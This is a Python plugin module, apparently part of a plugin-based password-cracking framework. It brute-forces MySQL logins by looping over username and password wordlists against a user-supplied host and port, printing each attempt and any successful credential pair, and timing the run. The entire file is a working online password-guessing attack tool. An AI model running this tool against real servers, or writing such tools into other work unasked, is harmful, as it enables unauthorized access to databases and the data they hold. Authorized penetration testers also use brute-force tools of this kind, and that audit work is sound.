import pymysql
import itertools
from yapsy.IPlugin import IPlugin
from time_functions import SpeedBenchmark

class MySQL(IPlugin):

    time_benchmark = SpeedBenchmark()
    list_usrnames = []
    list_passwds = []
    pass_found = 0

    def get_passwords(self, file_path):
        try:
            self.list_passwds = [line.strip() for line in open(file_path)]
            return self.list_passwds
        except:
            self.get_passwords(input("Invalid file. Try again: "))

    def get_usernames(self, file_path):
        try:
            self.list_usrnames = [line.strip() for line in open(file_path)]
            return self.list_usrnames
        except:
            self.get_usernames(input("Invalid file. Try again: "))

    def connection(self, user_host, user_port, user_name, pass_word):
        try:
            conn = pymysql.connect(host=str(user_host), port=int(user_port), user=str(user_name), passwd=str(pass_word))
            conn.close()
            return 1
        except Exception as e:
            if "Can't connect" in str(e):
                raise SystemExit("\n[!] Could not connect to server!")
            else:
                return 0

    def exec_module(self):
        menu_break = False
        usr_quit = input("Quit when valid pair found? (y/n) ")
        usr_host = input("Host: ")
        usr_port = input("Port: ")

        file_usernames = self.get_usernames(input("Path to usernames file: "))
        file_passwords = self.get_passwords(input("Path to passwords file: "))

        self.time_benchmark.start_benchmark()

        for name in self.list_usrnames:
            if menu_break == True:
                break
            print("Trying username {}:".format(name))
            for passwd in self.list_passwds:
                print("	{}".format(passwd))
                code_return = self.connection(usr_host, usr_port, name, passwd)

                if code_return == 1:
                    print("\nLogged in successful! Username {} and password {}.".format(name, passwd))
                    self.pass_found += 1
                    if usr_quit == "y":
                        menu_break = True
                    break

        self.time_benchmark.stop_benchmark()

        print("\nFound {} username/password combos!\n".format(self.pass_found))
        print("Took {} to process {} usernames and {} passwords ({} combinations)".format(
                                                    self.time_benchmark.get_benchmark(),
                                                    len(self.list_usrnames), len(self.list_passwds),
                                                    len(list(itertools.product(self.list_usrnames,self.list_passwds)))))
